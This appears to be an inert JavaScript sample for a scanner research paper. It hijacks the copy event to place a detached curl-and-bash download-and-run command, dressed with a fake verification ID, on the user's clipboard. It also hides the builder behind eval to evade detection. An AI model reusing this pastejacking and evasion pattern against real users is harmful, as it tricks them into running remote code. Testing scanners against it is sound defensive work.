// Inert bypass variant for the scanner paper (RQ3): placeholder values only,
// example.invalid cannot resolve, and the scanner never runs this file.
// Change: the builder is looked up by name through eval.
function detach(command) { return `nohup bash -c "${command}" >/dev/null 2>&1 &`; }
function buildCommand(origin, nonce) { return detach(`curl -ks ${origin}/demo -o /tmp/demo && bash /tmp/demo`) + ` # Verification ID ${nonce}`; }
document.addEventListener('copy', event => { event.preventDefault(); event.clipboardData.setData('text/plain', eval('build' + 'Command')('https://example.invalid', 'VERIFY-0000')); });
